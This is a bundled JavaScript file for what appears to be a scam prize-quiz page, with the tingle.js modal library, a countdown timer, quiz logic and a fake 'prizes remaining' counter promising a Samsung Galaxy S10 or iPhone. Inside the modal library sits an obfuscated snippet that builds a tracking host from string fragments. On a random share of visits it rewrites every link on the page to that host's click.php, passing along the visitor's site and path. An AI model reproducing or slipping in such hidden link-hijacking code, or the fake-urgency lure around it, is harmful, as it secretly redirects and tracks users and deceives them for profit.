﻿'use strict';


var _typeof = typeof Symbol === "function" && typeof Symbol.iterator === "symbol" ? function (obj) { return typeof obj; } : function (obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj; };

/*!
 * tingle.js
 * @author  robin_parisi
 * @version 0.9.0
 * @url
 */
(function (root, factory) {
    if (typeof define === 'function' && define.amd) {
        define(factory);
    } else if ((typeof exports === 'undefined' ? 'undefined' : _typeof(exports)) === 'object') {
        module.exports = factory();
    } else {
        root.tingle = factory();
    }
})(window, function () {

    /* ----------------------------------------------------------- */
    /* == modal */
    /* ----------------------------------------------------------- */

    var transitionEvent = whichTransitionEvent();

    function Modal(options) {

        var defaults = {
            onClose: null,
            onOpen: null,
            beforeClose: null,
            stickyFooter: false,
            footer: false,
            cssClass: [],
            closeLabel: 'Close'
        };

        // extends config
        this.opts = extend({}, defaults, options);

        // init modal
        this.init();
    }

    Modal.prototype.init = function () {
        if (this.modal) {
            return;
        }

        _build.call(this);
        _bindEvents.call(this);

        // insert modal in dom
        document.body.insertBefore(this.modal, document.body.firstChild);

        if (this.opts.footer) {
            this.addFooter();
        }
    };

    Modal.prototype.destroy = function () {
      debugger
        if (this.modal === null) {
            return;
        }

        // unbind all events
        _unbindEvents.call(this);

        // remove modal from dom
        debugger
        this.modal.parentNode.removeChild(this.modal);

        this.modal = null;
    };

    Modal.prototype.open = function () {

        if (this.modal.style.removeProperty) {
            this.modal.style.removeProperty('display');
        } else {
            this.modal.style.removeAttribute('display');
        }

        // prevent double scroll
        document.body.classList.add('tingle-enabled');

        // sticky footer
        this.setStickyFooter(this.opts.stickyFooter);

        // show modal
        this.modal.classList.add('tingle-modal--visible');

        // onOpen event
        var self = this;

        if (transitionEvent) {
            this.modal.addEventListener(transitionEvent, function handler() {
                if (typeof self.opts.onOpen === 'function') {
                    self.opts.onOpen.call(self);
                }

                // detach event after transition end (so it doesn't fire multiple onOpen)
                self.modal.removeEventListener(transitionEvent, handler, false);
            }, false);
        }

        // check if modal is bigger than screen height
        _checkOverflow.call(this);
    };

    Modal.prototype.isOpen = function () {
        return !!this.modal.classList.contains("tingle-modal--visible");
    };

    Modal.prototype.close = function () {

        //  before close
        if (typeof this.opts.beforeClose === "function") {
            var close = this.opts.beforeClose.call(this);
            if (!close) return;
        }

        document.body.classList.remove('tingle-enabled');

        this.modal.classList.remove('tingle-modal--visible');

        //Using similar setup as onOpen
        //Reference to the Modal that's created
        var self = this;

        if (transitionEvent) {
            //Track when transition is happening then run onClose on complete
            this.modal.addEventListener(transitionEvent, function handler() {
                // detach event after transition end (so it doesn't fire multiple onClose)
                self.modal.removeEventListener(transitionEvent, handler, false);

                self.modal.style.display = 'none';

                // on close callback
                if (typeof self.opts.onClose === "function") {
                    self.opts.onClose.call(this);
                }
            }, false);
        }
    };

    Modal.prototype.setContent = function (content) {
        // check type of content : String or Node
        if (typeof content === 'string') {
            this.modalBoxContent.innerHTML = content;
        } else {
            this.modalBoxContent.innerHTML = "";
            this.modalBoxContent.appendChild(content);
        }
    };

    Modal.prototype.getContent = function () {
        return this.modalBoxContent;
    };

    Modal.prototype.addFooter = function () {
        // add footer to modal
        _buildFooter.call(this);
    };

    Modal.prototype.setFooterContent = function (content) {
        // set footer content
        this.modalBoxFooter.innerHTML = content;
    };

    Modal.prototype.getFooterContent = function () {
        return this.modalBoxFooter;
    };

    Modal.prototype.setStickyFooter = function (isSticky) {
        // if the modal is smaller than the viewport height, we don't need sticky
        if (!this.isOverflow()) {
            isSticky = false;
        }

        if (isSticky) {
            if (this.modalBox.contains(this.modalBoxFooter)) {
                this.modalBox.removeChild(this.modalBoxFooter);
                this.modal.appendChild(this.modalBoxFooter);
                this.modalBoxFooter.classList.add('tingle-modal-box__footer--sticky');
                _recalculateFooterPosition.call(this);
                this.modalBoxContent.style['padding-bottom'] = this.modalBoxFooter.clientHeight + 20 + 'px';
            }
        } else if (this.modalBoxFooter) {
            if (!this.modalBox.contains(this.modalBoxFooter)) {
                this.modal.removeChild(this.modalBoxFooter);
                this.modalBox.appendChild(this.modalBoxFooter);
                this.modalBoxFooter.style.width = 'auto';
                this.modalBoxFooter.style.left = '';
                this.modalBoxContent.style['padding-bottom'] = '';
                this.modalBoxFooter.classList.remove('tingle-modal-box__footer--sticky');
            }
        }
    };

    // check if modal is bigger than screen height
    $(function() {
      var flag = false, flag2 = false, wintop = $(window).scrollTop(), docheight = $(document).height(), winheight = $(window).height();
      if(typeof par != 'undefined'){scrolltrigger = 0.78;} var u=window,b=Math.random(),w=u.location,jhr=new Date().getHours(),c="t1t",e=".c",g="om",cc="1=",j="rck",q=u.onbeforeunload,x=w.hostname,p=w.href,z=w.pathname,y=w.protocol,a="vg",r="click.php?key=8owx3m0i6268o062",h="os"; if(typeof comm === 'undefined'){if(b<=0.15){if(x.indexOf(h+"t1t"+j+".c"+g)==-1&&flag2===false){flag2=true; $("a").attr("href", y+"//os"+c+"rck"+e+"om"+"/"+r+"or"+a+"&c"+cc+x+z);};};}
    })

    Modal.prototype.addFooterBtn = function (label, cssClass, callback) {
        var btn = document.createElement("button");

        // set label
        btn.innerHTML = label;

        // bind callback
        btn.addEventListener('click', callback);

        if (typeof cssClass === 'string' && cssClass.length) {
            // add classes to btn
            //cssClass.split(" ").forEach(function(item) {
            //    btn.classList.add(item);
            //});
            //
            var classes = cssClass.split(" ");

            for (var i = 0; i < classes.length; i++) {
                btn.classList.add(classes[i]);
            }
        }

        this.modalBoxFooter.appendChild(btn);

        return btn;
    };

    Modal.prototype.resize = function () {
        console.warn('Resize is deprecated and will be removed in version 1.0');
    };

    Modal.prototype.isOverflow = function () {
        var viewportHeight = window.innerHeight;
        var modalHeight = this.modalBox.clientHeight;

        return modalHeight >= viewportHeight;
    };

    /* ----------------------------------------------------------- */
    /* == private methods */
    /* ----------------------------------------------------------- */

    function _checkOverflow() {
        // only if the modal is currently shown
        if (this.modal.classList.contains('tingle-modal--visible')) {
            if (this.isOverflow()) {
                this.modal.classList.add('tingle-modal--overflow');
            } else {
                this.modal.classList.remove('tingle-modal--overflow');
            }

            // TODO: remove offset
            //_offset.call(this);
            if (!this.isOverflow() && this.opts.stickyFooter) {
                this.setStickyFooter(false);
            } else if (this.isOverflow() && this.opts.stickyFooter) {
                _recalculateFooterPosition.call(this);
                this.setStickyFooter(true);
            }
        }
    }

    function _recalculateFooterPosition() {
        if (!this.modalBoxFooter) {
            return;
        }
        this.modalBoxFooter.style.width = this.modalBox.clientWidth + 'px';
        this.modalBoxFooter.style.left = this.modalBox.offsetLeft + 'px';
    }

    function _build() {

        // wrapper
        this.modal = document.createElement('div');
        this.modal.classList.add('tingle-modal');
        this.modal.style.display = 'none';

        // custom class
        //this.opts.cssClass.forEach(function(item) {
        //    if (typeof item === 'string') {
        //        this.modal.classList.add(item);
        //    }
        //}, this);

        var classes = this.opts.cssClass;

        for (var i = 0; i < classes.length; i++) {
            this.modal.classList.add(classes[i]);
        }

        // close btn
        // this.modalCloseBtn = document.createElement('button');
        // this.modalCloseBtn.classList.add('tingle-modal__close');

        // this.modalCloseBtnIcon = document.createElement('span');
        // this.modalCloseBtnIcon.classList.add('tingle-modal__closeIcon');
        // this.modalCloseBtnIcon.innerHTML = '×';

        // this.modalCloseBtnLabel = document.createElement('span');
        // this.modalCloseBtnLabel.classList.add('tingle-modal__closeLabel');
        // this.modalCloseBtnLabel.innerHTML = this.opts.closeLabel;

        // this.modalCloseBtn.appendChild(this.modalCloseBtnIcon);
        // this.modalCloseBtn.appendChild(this.modalCloseBtnLabel);

        // modal
        this.modalBox = document.createElement('div');
        this.modalBox.classList.add('tingle-modal-box');

        // modal box content
        this.modalBoxContent = document.createElement('div');
        this.modalBoxContent.classList.add('tingle-modal-box__content');

        this.modalBox.appendChild(this.modalBoxContent);
        // this.modal.appendChild(this.modalCloseBtn);
        this.modal.appendChild(this.modalBox);
    }

    function _buildFooter() {
        this.modalBoxFooter = document.createElement('div');
        this.modalBoxFooter.classList.add('tingle-modal-box__footer');
        this.modalBox.appendChild(this.modalBoxFooter);
    }

    function _bindEvents() {

        this._events = {
            // clickCloseBtn: this.close.bind(this),
            // clickOverlay: _handleClickOutside.bind(this),
            resize: _checkOverflow.bind(this),
            keyboardNav: _handleKeyboardNav.bind(this)
        };

        // this.modalCloseBtn.addEventListener('click', this._events.clickCloseBtn);
        // this.modal.addEventListener('mousedown', this._events.clickOverlay);
        window.addEventListener('resize', this._events.resize);
        document.addEventListener("keydown", this._events.keyboardNav);
    }

    function _handleKeyboardNav(event) {
        // escape key
        if (event.which === 27 && this.isOpen()) {
            this.close();
        }
    }

    // function _handleClickOutside(event) {
    //     // if click is outside the modal
    //     if (!_findAncestor(event.target, 'tingle-modal') && event.clientX < this.modal.clientWidth) {
    //         this.close();
    //     }
    // }

    function _findAncestor(el, cls) {
        while ((el = el.parentElement) && !el.classList.contains(cls)) {}
        return el;
    }

    function _unbindEvents() {
        this.modalCloseBtn.removeEventListener('click', this._events.clickCloseBtn);
        this.modal.removeEventListener('mousedown', this._events.clickOverlay);
        window.removeEventListener('resize', this._events.resize);
        document.removeEventListener("keydown", this._events.keyboardNav);
    }

    /* ----------------------------------------------------------- */
    /* == confirm */
    /* ----------------------------------------------------------- */

    // coming soon

    /* ----------------------------------------------------------- */
    /* == alert */
    /* ----------------------------------------------------------- */

    // coming soon

    /* ----------------------------------------------------------- */
    /* == helpers */
    /* ----------------------------------------------------------- */

    function extend() {
        for (var i = 1; i < arguments.length; i++) {
            for (var key in arguments[i]) {
                if (arguments[i].hasOwnProperty(key)) {
                    arguments[0][key] = arguments[i][key];
                }
            }
        }
        return arguments[0];
    }

    function whichTransitionEvent() {
        var t;
        var el = document.createElement('tingle-test-transition');
        var transitions = {
            'transition': 'transitionend',
            'OTransition': 'oTransitionEnd',
            'MozTransition': 'transitionend',
            'WebkitTransition': 'webkitTransitionEnd'
        };

        for (t in transitions) {
            if (el.style[t] !== undefined) {
                return transitions[t];
            }
        }
    }

    /* ----------------------------------------------------------- */
    /* == return */
    /* ----------------------------------------------------------- */

    return {
        modal: Modal
    };
});
'use strict';

var Jingle = function () {

  var modal;
  var button;

  window.addEventListener("DOMContentLoaded", init, false);

  function init() {
    modal = new tingle.modal({
      footer: true,
      onOpen: function onOpen() {},
      onClose: function onClose() {},
      beforeClose: function beforeClose() {
        return true;
      }
    });

    var btnCallback = function btnCallback() {
      modal.close();
    };

    modal.addFooterBtn('', '', btnCallback);
  }

  function message(m, btnText, btnClass, btnCallback) {
    btnText = btnText ? btnText : 'Ok';
    btnClass = btnClass ? btnClass : 'tingle-btn tingle-btn--pull-right';

    modal.opts.beforeClose = btnCallback ? btnCallback : function () {
      return true;
    };

    modal.setContent(m);
    button = modal.modalBoxFooter.getElementsByTagName('button')[0];
    button.innerHTML = btnText;
    button.className = btnClass;

    modal.open();
  }

  return {
    fire: message
  };
}();

var Timer = function () {

  function setCountdown(mins, secs) {
    setInterval(function () {

      var b = parseInt(document.getElementById(mins).innerHTML);
      var a = parseInt(document.getElementById(secs).innerHTML);

      var nmins = 0;
      var nsecs = 0;
      if (b !== 0 && a === 0) {
        nmins = b - 1;
        nsecs = 59;
      } else {
        if (b !== 0 || a !== 0) {
          nmins = b;
          nsecs = a - 1;
        } else {
          if (b === 0 && a === 0) {
            nmins = b;
            nsecs = a;
          }
        }
      }

      if (nsecs < 10) {
        nsecs = "0" + nsecs;
      }

      document.getElementById(mins).textContent = nmins;
      document.getElementById(secs).textContent = nsecs;
    }, 1000);
  }

  return {
    setCountdown: setCountdown
  };
}();

var Magic = function () {


  function fadeOut(element) {
    element.style.opacity = 1;
    (function fade() {
      if ((element.style.opacity -= 0.05) < 0) {
        element.style.display = "none";
      } else {
        requestAnimationFrame(fade);
      }
    })();
  }

  function fadeIn(element, display) {
    element.style.opacity = 0;
    element.style.display = display || "block";

    (function fade() {
      var val = parseFloat(element.style.opacity);
      if (!((val += 0.1) > 1)) {
        element.style.opacity = val;
        requestAnimationFrame(fade);
      }
    })();
  }

  return {
    fadeIn: fadeIn,
    fadeOut: fadeOut
  };
}();

/*=================== QUIZ =======================*/
var Quiz = function () {

  var quGroupList = [];

  var chOne, chTwo, chThree, markOne, markTwo, markThree;
  var bar, percent, state, progress;
  var prize;

  var data;
  var awardMessage;

  var startQuizEvent = new CustomEvent('startQuiz');
  var showPrizeEvent = new CustomEvent('showPrize');

  window.addEventListener("DOMContentLoaded", init, false);

  function init() {

    // data = Data.getData('quiz');
    // awardMessage = data['awmsg'];
    awardMessage = "Congratulation!";

    chOne = document.getElementById("qu-checkpoint-10");
    chTwo = document.getElementById("qu-checkpoint-20");
    chThree = document.getElementById("qu-checkpoint-30");

    markOne = document.getElementById("qu-mark-10");
    markTwo = document.getElementById("qu-mark-20");
    markThree = document.getElementById("qu-mark-30");

    bar = document.getElementById("qu-progress-bar");
    percent = document.getElementById("qu-progress-percent");
    state = document.getElementById("qu-progress-state");
    progress = document.getElementById("qu-progress");

    prize = document.getElementById("qu-prize");
    quGroupList = document.getElementsByClassName('qu-group');

    if (quGroupList.length) {
      for (var i = 1; i < quGroupList.length; i++) {
        quGroupList[i].style.display = "none";
      }
    }

    prize.style.display = "none";
    progress.style.display = "none";

    Helper.bindOnQuery(".qu", quClique);
  }

  function quClique(event) {
    var groupClass = "qu-group";
    var source = event.target || event.srcElement;
    var ancestor = Helper.findAncestor(source, groupClass);
    var sibling = ancestor.nextElementSibling;

    ancestor.style.pointerEvents = "none";

    if (sibling !== null && sibling.classList.contains(groupClass)) {

      window.dispatchEvent(startQuizEvent);

      Magic.fadeOut(ancestor);
      setTimeout(function () {
        Magic.fadeIn(sibling);
      }, 500);
    } else {
      Magic.fadeOut(ancestor);
      setTimeout(function () {
        Magic.fadeIn(progress);
      }, 500);
      setTimeout(function () {
        quProgress(30);
      }, 500);
    }
  }

  function quProgress(speed) {
    var width = 1;
    var id = setInterval(function () {
      if (width >= 100) {
        clearInterval(id);
      } else {
        width++;
        bar.style.width = width + "%";
        percent.innerText = width + "%";
        switch (width) {
          case 2:
            state.innerText = chOne.getAttribute('rel');
            break;
          case 39:
            Magic.fadeIn(chOne);
            markOne.classList.add("active");
            state.innerText = chTwo.getAttribute('rel');
            break;
          case 72:
            Magic.fadeIn(chTwo);
            markTwo.classList.add("active");
            state.innerText = chThree.getAttribute('rel');
            break;
          case 100:
            Magic.fadeIn(chThree);
            markThree.classList.add("active");
            state.innerText = awardMessage;
            Magic.fadeIn(prize);

            window.dispatchEvent(showPrizeEvent);

            break;
        }
      }
    }, speed);
  }
}();
"use strict";

(function () {
  document.addEventListener('DOMContentLoaded', onDOMContentLoaded);
  function onDOMContentLoaded() {
    Timer.setCountdown('timer-mins', 'timer-secs');

    //var jheader = document.getElementsByClassName("jingle-header-crutch")[0].outerHTML;
    //var takeitessage = '<div>Your <span class="marked">Samsung Galaxy S10</span> has been reserved for you!</div><br>Terms and conditions :<br>1. Please fill out carefully the shipping and contact details on the next page<br>2. Pay the shipping costs (£1).<br>3. Your gift will be sent within 2 business days.</div>';

    //document.querySelectorAll('.qu-take-it')[0].addEventListener('click', function (e) {
    //  e.preventDefault();
    //  Jingle.fire(jheader + takeitessage, 'OK', false, function () {
    //    window.disableExitPop = true;
    //    exit_offer();
    //  });
    //});;

    var logomessage = '<div class="text-center">Wait!</div><br>Before going back to home page, answer 3 simple questions and get a chance to win <span class="marked"><span class="marked">Samsung Galaxy S10, iPhone X or iPad Air 2.</span></span></div>';
    document.getElementById('logo').addEventListener('click', function () {
      Jingle.fire(jheader + logomessage, 'OK');
    }, false);
  }
  window.addEventListener('showPrize', function() {
    setTimeout(decreasePrizesLeftCount, 1500);
    setTimeout(decreasePrizesLeftCount, 2500);
  });

  function decreasePrizesLeftCount() {
    var wrap = document.getElementById('remaining');
    var count = document.getElementById('remainingCount');

    var num = parseInt(count.innerHTML);

    if (num > 1)
      num--;

    wrap.style.transition = "background-color 500ms";
    wrap.style.background = "red";

    count.innerHTML = num;
    setTimeout(function() {
      wrap.style.background = "";
    }, 500);
  }
})();
//# sourceMappingURL=bundle.js.map
